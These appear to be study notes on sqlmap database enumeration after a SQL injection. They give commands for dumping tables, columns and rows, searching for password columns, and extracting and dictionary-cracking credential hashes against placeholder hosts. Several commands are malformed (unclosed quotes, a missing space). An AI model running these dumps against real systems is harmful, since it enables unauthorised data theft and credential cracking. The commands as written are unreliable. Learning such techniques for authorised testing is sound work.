# Database Enumeration

Right after the successful detection and confirmation of the edxploit, we need to lookup and exfiltrate all the available information.

## Basic DB Data Enumeration

We can enumerate basic details of the database:

`--hostname`, `--current-user`, `--current-db`, `--passwords`.

Checking if the current user has administrator rights: `--is-dba`.

## Table Enumeration

After finding the current database name, we can retrieve the table names, whcih can be done by `--tables` and specifying the name of the database with `-D`.

```sh
sqlmap -u "http://server.com/?id=1 --tables -D testdb
```

Now we will get the tables, and if we are interested for example on the `users` table, and want to get the information in the table, we can do that with the `--dump` option.

```sh
sqlmap -u "http://server.com/?id=1 --dump -T users -D testdb
```

## Column/Row Enumeration

We can also enumerate columns and/or rows with the `-C` option.

```sh
sqlmap-u "http://server.com/?id=1 --dump -T users -D testdb -C name,surname
```

We can also decide which part of the rows we want to take with `--start` and `--stop`:

```sh
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

## Conditional Enumeration

We can also enumerate based on a WHERE condition, for example if we wnat to see names starting with `h`:

```sh
sqlmap -u "http://server.com/?id=1" --dump -T users -D testdb --where="name LIKE 'h%'"
```

# Advanced Database Enumeration

**Schema** can be enumerated with the option `--schema`.

When tehre are complex database structures we can searc hdo dbs, tables, and columns with the `--search` option, which enables the usage of the LIKE operator.

So if we want to look for all tables containing the keyword user, we can do it via:

```sh
--search -T user
```

We can search also for columns, for example for a `pass` keyword:

```sh
--search -C pass`
```

**Password Enumeration and Cracking**
When we identify a table that has passwords, we retrieve that using the `-T` option, and SQLMap has automatic password hashes cracking capabilities.

Upon retrieving a value with a known hash format, it it prompts us to perform a dictionary-based attack.

We can also ease the whole process with the option `--passwords` which attempts to dump the content of system tables that contain database-specific credentials.

